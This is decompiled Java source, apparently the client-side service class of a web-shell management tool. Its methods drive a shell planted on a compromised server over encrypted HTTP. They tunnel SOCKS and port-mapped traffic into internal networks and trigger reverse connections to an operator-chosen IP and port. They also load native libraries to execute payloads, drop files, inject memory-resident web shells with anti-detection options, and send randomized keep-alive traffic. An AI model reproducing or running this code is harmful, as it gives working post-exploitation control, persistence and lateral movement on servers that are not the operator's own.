   public JSONObject stopVPSSocks() throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "stop");
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "RemoteSocksProxy", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var7 = result.keySet().iterator();

      while(var7.hasNext()) {
         String key = (String)var7.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public boolean createPortMap(String targetIP, String targetPort, String socketHash) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "createLocal");
      params.put("targetIP", targetIP);
      params.put("targetPort", targetPort);
      params.put("socketHash", socketHash);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
      Map result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      Map resHeader = (Map)result.get("header");
      byte[] resData = (byte[])((byte[])result.get("data"));
      if (((String)resHeader.get("status")).equals("200")) {
         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = Arrays.copyOfRange(resData, 4, resData.length);
            throw new Exception(new String(resData));
         } else {
            return true;
         }
      } else {
         return false;
      }
   }

   public byte[] readPortMapData(String targetIP, String targetPort, String socketHash) throws Exception {
      byte[] resData = null;
      Map params = new LinkedHashMap();
      params.put("action", "read");
      params.put("targetIP", targetIP);
      params.put("targetPort", targetPort);
      params.put("socketHash", socketHash);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
      Map result = null;

      try {
         result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      } catch (Exception var10) {
         byte[] exceptionByte = var10.getMessage().getBytes();
         if (exceptionByte[0] == 55 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 54) {
            resData = Arrays.copyOfRange(exceptionByte, 4, exceptionByte.length);
            throw new Exception(new String(resData, "UTF-8"));
         }

         throw var10;
      }

      Map resHeader = (Map)result.get("header");
      if (((String)resHeader.get("status")).equals("200")) {
         resData = (byte[])((byte[])result.get("data"));
         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = Arrays.copyOfRange(resData, 4, resData.length);
            throw new Exception(new String(resData));
         }

         if (resHeader.containsKey("server") && ((String)resHeader.get("server")).indexOf("Apache-Coyote/1.1") > 0) {
            resData = Arrays.copyOfRange(resData, 0, resData.length - 1);
         }

         if (resData == null) {
            resData = new byte[0];
         }
      } else {
         resData = null;
      }

      return resData;
   }

   public boolean writePortMapData(byte[] proxyData, String targetIP, String targetPort, String socketHash) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "write");
      params.put("targetIP", targetIP);
      params.put("targetPort", targetPort);
      params.put("socketHash", socketHash);
      if (this.currentType.equals("php")) {
         params.put("remoteIP", "");
         params.put("remotePort", "");
      }

      params.put("extraData", Base64.encode(proxyData));
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
      Map result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      Map resHeader = (Map)result.get("header");
      byte[] resData = (byte[])((byte[])result.get("data"));
      if (((String)resHeader.get("status")).equals("200")) {
         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = Arrays.copyOfRange(resData, 4, resData.length);
            return false;
         } else {
            return true;
         }
      } else {
         return false;
      }
   }

   public boolean closeLocalPortMap(String targetIP, String targetPort) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "closeLocal");
      params.put("targetIP", targetIP);
      params.put("targetPort", targetPort);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
      Map resHeader = (Map)Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");
      return ((String)resHeader.get("status")).equals("200");
   }

   public boolean closeLocalPortMapWorker(String socketHash) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "closeLocalWorker");
      params.put("socketHash", socketHash);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
      Map resHeader = (Map)Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");
      return ((String)resHeader.get("status")).equals("200");
   }

   public boolean closeRemotePortMap() throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "closeRemote");
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
      Map resHeader = (Map)Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");
      return ((String)resHeader.get("status")).equals("200");
   }

   public byte[] readProxyData(String socketHash) throws Exception {
      byte[] resData = null;
      Map params = new LinkedHashMap();
      params.put("cmd", "READ");
      if (this.currentType.equals("php")) {
         params.put("remoteIP", "");
         params.put("remotePort", "");
      }

      params.put("socketHash", socketHash);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);
      Map result = null;

      try {
         result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      } catch (Exception var8) {
         byte[] exceptionByte = var8.getMessage().getBytes();
         if (exceptionByte[0] == 55 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 54) {
            return null;
         }

         throw var8;
      }

      Map resHeader = (Map)result.get("header");
      if (((String)resHeader.get("status")).equals("200")) {
         resData = (byte[])((byte[])result.get("data"));
         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = null;
         } else {
            if (resHeader.containsKey("server") && ((String)resHeader.get("server")).indexOf("Apache-Coyote/1.1") > 0) {
               resData = Arrays.copyOfRange(resData, 0, resData.length - 1);
            }

            if (resData == null) {
               resData = new byte[0];
            }
         }
      } else {
         resData = null;
      }

      return resData;
   }

   public boolean writeProxyData(byte[] proxyData, String socketHash) throws Exception {
      Map params = new LinkedHashMap();
      params.put("cmd", "FORWARD");
      params.put("targetIP", "");
      params.put("targetPort", "");
      params.put("socketHash", socketHash);
      params.put("extraData", Base64.encode(proxyData));
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);
      Map result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      Map resHeader = (Map)result.get("header");
      byte[] resData = (byte[])((byte[])result.get("data"));
      if (((String)resHeader.get("status")).equals("200")) {
         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = Arrays.copyOfRange(resData, 4, resData.length);
            return false;
         } else {
            return true;
         }
      } else {
         return false;
      }
   }

   public boolean closeProxy(String socketHash) throws Exception {
      Map params = new LinkedHashMap();
      params.put("cmd", "DISCONNECT");
      params.put("socketHash", socketHash);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);
      Map resHeader = (Map)Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");
      return ((String)resHeader.get("status")).equals("200");
   }

   public boolean openProxy(String destHost, String destPort, String socketHash) throws Exception {
      Map params = new LinkedHashMap();
      params.put("cmd", "CONNECT");
      params.put("targetIP", destHost);
      params.put("targetPort", destPort);
      params.put("socketHash", socketHash);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);
      Map result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      Map resHeader = (Map)result.get("header");
      byte[] resData = (byte[])((byte[])result.get("data"));
      if (((String)resHeader.get("status")).equals("200")) {
         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = Arrays.copyOfRange(resData, 4, resData.length);
            return false;
         } else {
            return true;
         }
      } else {
         return false;
      }
   }

   public boolean openProxyAsyc(String destHost, String destPort, String socketHash) throws Exception {
      Map params = new LinkedHashMap();
      params.put("cmd", "CONNECT");
      params.put("targetIP", destHost);
      params.put("targetPort", destPort);
      params.put("socketHash", socketHash);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);
      Runnable backgroundRunner = () -> {
         Map result = null;

         try {
            result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
         } catch (Exception var5) {
            var5.printStackTrace();
         }

         Map resHeader = (Map)result.get("header");
         byte[] resData = (byte[])((byte[])result.get("data"));
         if (((String)resHeader.get("status")).equals("200") && resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = Arrays.copyOfRange(resData, 4, resData.length);
            System.out.println("openProxyAsyc failed:" + new String(resData));
         }

      };
      (new Thread(backgroundRunner)).start();
      return true;
   }

   public JSONObject echo(String content) throws Exception {
      Map params = new LinkedHashMap();
      params.put("content", content);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "Echo", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      Map responseHeader = (Map)resultObj.get("header");
      Iterator var6 = responseHeader.keySet().iterator();

      while(var6.hasNext()) {
         String headerName = (String)var6.next();
         if (headerName != null && headerName.equalsIgnoreCase("Set-Cookie")) {
            String cookieValue = (String)responseHeader.get(headerName);
            this.mergeCookie(this.currentHeaders, cookieValue);
         }
      }

      String localResultTxt = "{\"status\":\"c3VjY2Vzcw==\",\"msg\":\"" + new String(java.util.Base64.getEncoder().encode(content.getBytes())) + "\"}";
      byte[] localResult = Crypt.Encrypt(localResultTxt.getBytes(), this.currentKey, this.currentType, this.encryptType);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      new String(resData);
      this.beginIndex = Utils.matchData(resData, localResult);
      if (this.beginIndex < 0) {
         this.beginIndex = 0;
         this.endIndex = 0;
      } else {
         this.endIndex = resData.length - this.beginIndex - localResult.length;
      }

      String resultTxt = new String(Crypt.Decrypt(Arrays.copyOfRange(resData, this.beginIndex, resData.length - this.endIndex), this.currentKey, this.encryptType, this.currentType));
      resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
      JSONObject result = new JSONObject(resultTxt);
      Iterator var12 = result.keySet().iterator();

      while(var12.hasNext()) {
         String key = (String)var12.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public String getBasicInfo(String whatever) throws Exception {
      String result = "";
      Map params = new LinkedHashMap();
      params.put("whatever", whatever);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "BasicInfo", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));

      try {
         result = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
         return result;
      } catch (Exception var8) {
         throw new Exception("请求失败:" + new String(resData, "UTF-8"));
      }
   }

   private void showErrorMessage(String title, String msg) {
      Alert alert = new Alert(AlertType.ERROR);
      Window window = alert.getDialogPane().getScene().getWindow();
      window.setOnCloseRequest((event) -> {
         window.hide();
      });
      alert.setTitle(title);
      alert.setHeaderText("");
      alert.setContentText(msg);
      alert.show();
   }

   public void keepAlive() throws Exception {
      while(true) {
         try {
            Thread.sleep((long)(((new Random()).nextInt(5) + 5) * 60 * 1000));
            int randomStringLength = (new SecureRandom()).nextInt(3000);
            this.echo(Utils.getRandomString(randomStringLength));
         } catch (Exception var2) {
            if (var2 instanceof InterruptedException) {
               return;
            }

            Platform.runLater(() -> {
               this.showErrorMessage("提示", "由于您长时间未操作，当前连接会话已超时，请重新打开该网站。");
            });
            return;
         }
      }
   }

   public JSONObject connectBack(String type, String ip, String port) throws Exception {
      Map params = new LinkedHashMap();
      params.put("type", type);
      params.put("ip", ip);
      params.put("port", port);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "ConnectBack", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));

      try {
         JSONObject result = new JSONObject(resultTxt);
         Iterator var10 = result.keySet().iterator();

         while(var10.hasNext()) {
            String key = (String)var10.next();
            result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
         }

         return result;
      } catch (Exception var12) {
         throw new Exception(resultTxt);
      }
   }

   public JSONObject loadNativeLibrary(String libraryPath) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "load");
      params.put("whatever", Utils.getWhatever());
      params.put("libraryPath", libraryPath);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var8 = result.keySet().iterator();

      while(var8.hasNext()) {
         String key = (String)var8.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject executePayload(String uploadLibPath, String payload) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "execute");
      params.put("whatever", Utils.getWhatever());
      params.put("uploadLibPath", uploadLibPath);
      params.put("payload", payload);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var9 = result.keySet().iterator();

      while(var9.hasNext()) {
         String key = (String)var9.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject loadLibraryAndexecutePayload(String fileContent, String payload) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "execute");
      params.put("whatever", Utils.getWhatever());
      params.put("fileContent", fileContent);
      params.put("payload", payload);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var9 = result.keySet().iterator();

      while(var9.hasNext()) {
         String key = (String)var9.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject loadLibraryAndfreeFile(String fileContent, String filePath) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "freeFile");
      params.put("whatever", Utils.getWhatever());
      params.put("fileContent", fileContent);
      params.put("filePath", filePath);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var9 = result.keySet().iterator();

      while(var9.hasNext()) {
         String key = (String)var9.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject freeFile(String uploadLibPath, String filePath) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "freeFile");
      params.put("whatever", Utils.getWhatever());
      params.put("uploadLibPath", uploadLibPath);
      params.put("filePath", filePath);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var9 = result.keySet().iterator();

      while(var9.hasNext()) {
         String key = (String)var9.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject loadLibraryAndAntiAgent(String fileContent) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "antiAgent");
      params.put("whatever", Utils.getWhatever());
      params.put("fileContent", fileContent);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var8 = result.keySet().iterator();

      while(var8.hasNext()) {
         String key = (String)var8.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject antiAgent(String uploadLibPath) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "antiAgent");
      params.put("whatever", Utils.getWhatever());
      params.put("uploadLibPath", uploadLibPath);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var8 = result.keySet().iterator();

      while(var8.hasNext()) {
         String key = (String)var8.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject loadLibraryAndtest() throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "test");
      params.put("whatever", Utils.getWhatever());
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var7 = result.keySet().iterator();

      while(var7.hasNext()) {
         String key = (String)var7.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject injectMemShell(String type, String libPath, String path, String password, boolean isAntiAgent) throws Exception {
      Map params = new LinkedHashMap();
      params.put("type", type);
      params.put("libPath", libPath);
      params.put("path", path);
      params.put("password", password);
      params.put("antiAgent", isAntiAgent + "");
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "MemShell", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var12 = result.keySet().iterator();

      while(var12.hasNext()) {
         String key = (String)var12.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject createReversePortMap(String listenPort) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "create");
      params.put("listenPort", listenPort);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "ReversePortMap", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));

      try {
         JSONObject result = new JSONObject(resultTxt);
         Iterator var8 = result.keySet().iterator();

         while(var8.hasNext()) {
            String key = (String)var8.next();
            result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
         }

         return result;
      } catch (Exception var10) {
         throw new Exception(new String(resData));
      }
   }

   public byte[] readReversePortMapData(String socketHash) throws Exception {
      byte[] resData = null;
      Map params = new LinkedHashMap();
      params.put("action", "read");
      params.put("socketHash", socketHash);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "ReversePortMap", params, this.currentType);
      Map result = null;

      try {
         result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      } catch (Exception var8) {
         byte[] exceptionByte = var8.getMessage().getBytes();
         if (exceptionByte[0] == 55 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 54) {
            return null;
         }

         throw var8;
      }

      Map resHeader = (Map)result.get("header");
      if (((String)resHeader.get("status")).equals("200")) {
         resData = (byte[])((byte[])result.get("data"));
         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = null;
         } else {
            if (resHeader.containsKey("server") && ((String)resHeader.get("server")).indexOf("Apache-Coyote/1.1") > 0) {
               resData = Arrays.copyOfRange(resData, 0, resData.length - 1);
            }

            if (resData == null) {
               resData = new byte[0];
            }
         }
      } else {
         resData = null;
      }

      return resData;
   }

   public boolean writeReversePortMapData(byte[] proxyData, String socketHash) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "write");
      params.put("socketHash", socketHash);
      params.put("extraData", Base64.encode(proxyData));
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "ReversePortMap", params, this.currentType);
      Map result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      Map resHeader = (Map)result.get("header");
      byte[] resData = (byte[])((byte[])result.get("data"));
      if (((String)resHeader.get("status")).equals("200")) {
         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = Arrays.copyOfRange(resData, 4, resData.length);
            return false;
         } else {
            return true;
         }
      } else {
         return false;
      }
   }

   public JSONObject listReversePortMap() throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "list");
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "ReversePortMap", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var7 = result.keySet().iterator();

      while(var7.hasNext()) {
         String key = (String)var7.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject stopReversePortMap(String listenPort) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "stop");
      params.put("listenPort", listenPort);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "ReversePortMap", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var8 = result.keySet().iterator();

      while(var8.hasNext()) {
         String key = (String)var8.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject closeReversePortMap(String socketHash) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "close");
      params.put("socketHash", socketHash);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "ReversePortMap", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var8 = result.keySet().iterator();

      while(var8.hasNext()) {
         String key = (String)var8.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }
}
